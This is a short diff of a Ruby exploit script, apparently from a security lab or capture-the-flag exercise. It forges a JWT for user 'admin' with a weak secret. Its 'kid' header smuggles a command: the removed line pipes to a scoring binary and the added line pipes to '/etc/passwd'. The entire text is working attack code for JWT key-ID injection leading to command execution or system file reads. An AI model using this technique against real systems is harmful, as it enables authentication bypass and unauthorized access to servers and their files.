@@ -4,7 +4,7 @@ require 'json'
 
 secret = "1000"
 
-header = {"typ"=>"JWT","alg"=>"HS256","kid"=>"|/usr/local/bin/score 4c1d03a1-b77a-43b0-8c49-373125b71272"}.to_json
+header = {"typ"=>"JWT","alg"=>"HS256","kid"=>"|/etc/passwd"}.to_json
 
 data = {"user" => "admin"}.to_json
 
